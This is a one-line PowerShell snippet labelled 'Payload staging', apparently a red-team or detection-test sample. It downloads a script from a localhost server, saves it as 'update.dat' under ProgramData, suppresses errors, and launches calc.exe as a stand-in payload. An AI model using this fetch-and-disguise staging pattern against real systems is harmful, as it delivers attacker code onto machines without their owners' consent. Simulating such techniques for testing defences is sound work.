
<# Payload staging #> Invoke-WebRequest -Uri "http://localhost:8080/stage1.ps1" -OutFile 'C:\ProgramData\update.dat' -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Output "stage 12 initialized"
